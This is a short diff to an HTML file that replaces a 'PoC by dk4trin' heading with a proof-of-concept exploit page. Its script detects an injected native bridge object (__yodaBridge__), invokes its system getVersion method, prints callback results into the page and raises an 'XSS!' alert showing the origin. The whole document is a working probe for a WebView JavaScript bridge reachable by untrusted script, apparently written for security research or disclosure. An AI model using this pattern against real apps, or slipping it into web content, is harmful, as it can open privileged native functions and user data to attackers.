@@ -1,1 +1,14 @@
-<h1>PoC by dk4trin</h1>
+<html>
+<body>
+<script>
+if (typeof __yodaBridge__ !== 'undefined') {
+    document.body.innerHTML = '<h1>Bridge encontrado!</h1>';
+    __yodaBridge__.invoke('system', 'getVersion', '{}', 'cb1');
+}
+window.__yodaBridgeCallback__ = function(id, result) {
+    document.body.innerHTML += '<pre>ID: '+id+'\nResult: '+result+'</pre>';
+};
+alert('XSS! Origin: ' + location.origin);
+</script>
+</body>
+</html>
